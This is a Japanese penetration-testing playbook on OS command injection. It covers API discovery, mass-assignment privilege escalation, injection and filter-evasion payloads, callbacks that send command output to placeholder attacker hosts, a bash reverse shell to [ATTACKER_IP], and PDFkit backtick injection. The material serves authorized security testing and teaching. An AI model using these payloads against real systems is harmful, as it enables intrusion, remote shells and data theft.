# OSコマンドインジェクション

> **スコープ**: Web アプリ・API が外部入力を OS コマンドの一部として組み込む脆弱性の検出と悪用。API エンドポイント発見〜Mass Assignment による権限昇格〜コマンドインジェクション確認〜フィルタ回避〜リバースシェル取得、および PDF 生成・Web 変換機能固有のバックティック注入まで扱う。シェル取得後の安定化は `../../03_Post_Access_Linux/Shell_Stabilization.md` を参照。

## 着火条件
- Web アプリ・API が外部入力を OS コマンドの一部として組み込んでいる
- VPN 設定生成・ping・traceroute・ファイル変換など、OS コマンドを内部で実行することが想定される機能がある
- API が `username` / `host` / `ip` / `domain` / `target` 等のパラメータを受け取り、処理結果を返す

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `curl` / `nc`（ペネトレ用 Linux ディストリ標準搭載）/ `exiftool`（PDF メタデータ確認。標準搭載）
- Blind コマンドインジェクション確認: `python3 -m http.server`（OOB コールバック）/ `interactsh-client`（Burp Collaborator 無料代替）
- 外部リソース依存: `[COLLAB_SUBDOMAIN].oastify.com`（Burp Collaborator）/ `interact.sh`（interactsh 公開インスタンス）はインターネット要。外部通信遮断時は `/tmp/` へのファイル出力 + Web 経由読取に切替

## 先に確認すること

- **コマンドインジェクションを疑うシグナル:**

| API の特徴 | 次のアクション |
|----------|--------------|
| `username` / `host` / `ip` 等の識別子パラメータを受け取る | セミコロン + `id` で注入テスト |
| レスポンスが「設定ファイル内容」「コマンド出力っぽいテキスト」を返す | 入力がコマンドに渡されている可能性が高い |
| パラメータを空にすると「Missing parameter」エラーが返る | サーバー側でのコマンド組み立てを示唆 |
| `; sleep 5` を送ると応答が 5 秒遅延する | タイムベースで確認できる |

- **管理者専用 API にコマンドインジェクションがある場合が多い**: 一般ユーザー API にはなく管理者 API にある、というパターンが典型。まず API 権限を昇格させてから試みる（§2）

**攻撃者の思考トレース:** まず `id` で確認してからリバースシェルへ移行する。確認なしにシェル取得を試みると成否が判断できない。タイムベース（`sleep 5`）はロードバランサー / WAF のタイムアウトで偽陰性が出やすいので、OOB（§3 末尾）を先に試す価値がある。

---

## 1. API エンドポイント一覧の取得

**コマンド:**

```bash
# [Attacker] 認証後セッションで /api/v1 等のルートエンドポイントを直接叩く
curl http://[TARGET]/api/v1 -H "Cookie: PHPSESSID=[SESSION]"
# → admin 用エンドポイント（PUT/POST 等）が一覧で得られる
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| エンドポイント一覧が返る | API 設計が自己記述型 | 管理者 API（PUT / POST）を特定して §2 / §3 へ |
| 404 / 403 | 一覧非公開 | ディレクトリ列挙 + Swagger / OpenAPI の誤公開確認 → `../../01_Reconnaissance/Exposed_Files.md` |

**注意:** 標準的なワードリストでの API エンドポイントファジングが失敗する場合、`/api/v1` 直叩きで一覧が取れることがある。

---

## 2. Mass Assignment による権限昇格（必要な場合）

認証後の API が `is_admin` / `role` / `privilege` 等のフィールドをクライアント側からの更新リクエストで受け付ける設計の場合、そのフィールドを改ざんすることで権限昇格できる（**OWASP API Security Top 10 (2023) API6: Mass Assignment / CWE-915**）。「管理者専用エンドポイントを一般ユーザーが叩ける」は API5: BFLA で別物。用語を混同しない。

**コマンド:**

```bash
# [Attacker] 管理者設定更新 API への改ざんリクエスト
curl -X PUT http://[TARGET]/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=[SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "is_admin": 1}'
# レスポンスに "is_admin":1 が返れば管理者権限取得

# [Attacker] 確認
curl http://[TARGET]/api/v1/admin/auth -H "Cookie: PHPSESSID=[SESSION]"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `"is_admin": 1` がレスポンスに返る | Mass Assignment 成立 / 管理者権限取得 | 管理者 API でコマンドインジェクションを試す（§3）|
| 400 / フィールドが無視される | サーバー側で制限されている | HTTP メソッドを PUT → PATCH に変えながらエラー変化を観察 |

**注意:** API レスポンスに `is_admin` / `role` / `admin` 等のフィールドが含まれる場合、それを PUT / PATCH で上書きできないか試す。

---

## 3. コマンドインジェクションテスト

**コマンド:**

```bash
# [Attacker] 基本確認（セミコロン区切り）
{"username": "test; id"}
{"username": "test; whoami"}

# [Attacker] タイムベース確認（応答が遅延すればコマンドが実行されている）
{"username": "test; sleep 5"}

# [Attacker] その他のシェルメタ文字
{"username": "test && id"}
{"username": "test | id"}
{"username": "test$(id)"}
{"username": "`id`"}
```

curl で送信する場合のシングルクォートエスケープ例:

```bash
curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=[SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"username": "test; id"}'
```

**フィルタ回避チートシート（`;` / スペースがブラックリストされている場合）:**

| フィルタ状況 | 代替手段 | 例 |
|---|---|---|
| `;` ブラックリスト | `\|` / `&&` / `\|\|` / 改行 `%0a` | `test%0aid` / `test\|id` / `test&&id` |
| スペース ` ` ブラックリスト | `${IFS}` / `<` リダイレクト / Tab `%09` | `cat${IFS}/etc/passwd` / `cat</etc/passwd` |
| 両方ブラックリスト | 組み合わせ | `test%0acat${IFS}/etc/passwd` |
| アルファベット制限（WAF）| 環境変数を利用した文字合成 | `${PATH%%/*}` / `${#0}` 等（高度）|

**OOB（Out-of-Band）DNS / HTTP コールバックによるブラインド確認（タイムベースより信頼性が高い）:**

```bash
# [Attacker] HTTP コールバック
{"username": "test; curl http://[COLLAB_SUBDOMAIN].oastify.com/$(id|base64)"}
{"username": "test; wget -qO- http://[ATTACKER_HTTP_SERVER]/$(whoami)"}

# [Attacker] DNS コールバック
{"username": "test; curl http://$(id|base64 -w0).[COLLAB_SUBDOMAIN].oastify.com/"}
{"username": "test; nslookup $(id|tr ' =' '_.').[COLLAB_SUBDOMAIN].oastify.com"}

# [Attacker] 外部通信が完全遮断の場合: ファイル出力経由の間接確認
{"username": "test; id > /tmp/[CASE_ID].txt"}
# その後 Web 経由で /tmp/[CASE_ID].txt が読めるパスを探す
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=` がレスポンスに含まれる | コマンドインジェクション確定 | §4 リバースシェルへ |
| 応答が 5 秒遅延する | タイムベース確認成立（Blind）| OOB 確認 → §4 リバースシェルへ |
| OOB コールバックが届く | Blind コマンドインジェクション確定 | §4 リバースシェルへ |
| `;` / `&&` が全て失敗 | フィルタあり | フィルタ回避表を順に試す |

**注意:** POSTボディの Content-Type が `application/x-www-form-urlencoded` の場合はパラメータ形式が `key=value&...` になる。

---

## 4. リバースシェル取得

> リバースシェルの仕組み・ポート選択・VPN 環境での IP 確認 → `../../06_Concepts/Reverse_Shell.md`

**事前準備（必須）:** テスター端末でリスナーを起動する。

```bash
# [Attacker]
nc -lvnp 4444
```

**コマンド（ペイロード）:**

```bash
# [Attacker] bash リバースシェル
bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'

# curl で送信する場合のシングルクォートエスケープ（'"'"' の分解）:
# ' → curl シングルクォート文字列を閉じる
# "'" → ダブルクォート内に ' 1 文字を置く
# ' → シングルクォート文字列を再び開く
curl -X POST http://[TARGET]/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=[SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"username": "test; bash -c '"'"'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'"'"'"}'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| nc リスナーに接続が来る | シェル取得成功 | §5 シェル安定化 |
| 接続が来ない | ファイアウォール / 別シェル構文が必要 | `python3` / `perl` / `php` 等の別リバースシェルペイロードを試す → `../../06_Concepts/Reverse_Shell.md` |

---

## 5. シェル安定化

> **詳細手順 → `../../03_Post_Access_Linux/Shell_Stabilization.md`**

リバースシェル取得直後は TTY が割り当てられていないため、`sudo` / `su` 等が使えない。安定化後は設定ファイル・`.env` の認証情報を探して横展開・権限昇格を目指す。

---

## 6. PDF 生成・Web 変換機能のバックティック注入

**着火条件:** Web アプリに「URL を入力して PDF / 画像 / スクリーンショットを生成する」機能がある。PDFkit (CVE-2022-25765) 等の変換ライブラリで発火。

**コマンド:**

```bash
# [Attacker] PDF のメタデータ確認（ライブラリ名・バージョンを特定）
exiftool [ダウンロードした].pdf
# 出力例: Producer: pdfkit v0.8.6

# [Attacker] バージョンから CVE を特定
searchsploit pdfkit
searchsploit [ライブラリ名] [バージョン]
```

**バックティック注入テスト:**

| テスト内容 | 結果 | 意味 |
|-----------|------|------|
| URL パラメータに `` `sleep 5` `` を含めて送信 | 応答が 5 秒遅延 | コマンドが実行されている |
| `` `curl http://[ATTACKER_IP]:[PORT]/` `` を送信し nc で待機 | nc に GET リクエストが届く | OOB で RCE 確認 |

**手順:**

1. ライブラリ名・バージョンを特定（exiftool / レスポンスヘッダー）
2. searchsploit → CVE 番号を確認 → `../../05_Tools_Reference/CVE_Notes.md` でペイロードを確認
3. nc リスナーと HTTP サーバー（シェルスクリプト配信用）を起動（**nc リスナーより先に HTTP サーバーを起動する**）
4. URL フォームにペイロードを送信してシェルを取得

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| nc リスナーに接続が来る | バックティック注入 RCE 成立 | §5 シェル安定化 |
| バックティックが無効 | フィルタあり | `$(command)` ドル記法を試す |
| バージョンがパッチ済み | 既知 CVE は不可 | SSRF として内部ネットワーク探索に切替 → `SSRF.md` |

**注意:** `[ATTACKER_IP]` にはテスター側の到達可能インターフェース（物理 LAN・VPN・専用線等）の IP を使う。`ip a` で全インターフェース確認。HTTP サーバー（シェルスクリプト配信）は nc リスナーより先に起動する。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `;` / `&&` 等が全て失敗 | フィルタあり | フィルタ回避表（§3）を順に試す |
| タイムベースが偽陰性 | LB / WAF のタイムアウト設定 | OOB（DNS / HTTP コールバック）を試す（§3）|
| 管理者 API にアクセスできない | 権限不足 | §2 Mass Assignment で権限昇格してから再試行 |
| リバースシェル接続が来ない | FW / 別シェルが必要 | `python3` / `perl` / `php` 等の別リバースシェルを試す |

---

## 注意点・落とし穴

- コマンドインジェクションのテストは**まず `id` で確認してからリバースシェルへ移行**する
- `www-data` や低権限ユーザーでシェルが取れた場合、`.env` / 設定ファイル等の認証情報を探して横展開・権限昇格を目指す
- API 管理者昇格はすべての API で成立するわけではない。`is_admin` フィールドの存在と書き込み可能であることが前提

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 関連技術
- 前：難読化 JS から API エンドポイント発見 → `JS_Obfuscation.md`
- 前：API エンドポイント列挙・ディレクトリ探索 → `../../01_Reconnaissance/Web_Enumeration.md`
- 後：シェル安定化 → `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：侵入後の `.env` ファイル・認証情報探索 → `../Credential_Discovery.md`
- 関連：リバースシェルの仕組み・ポート選択・IP 確認 → `../../06_Concepts/Reverse_Shell.md`
- 関連：CVE ペイロード詳細（PDFKit 等）→ `../../05_Tools_Reference/CVE_Notes.md`
- 関連：バージョンがパッチ済みの場合の SSRF への切り替え → `SSRF.md`
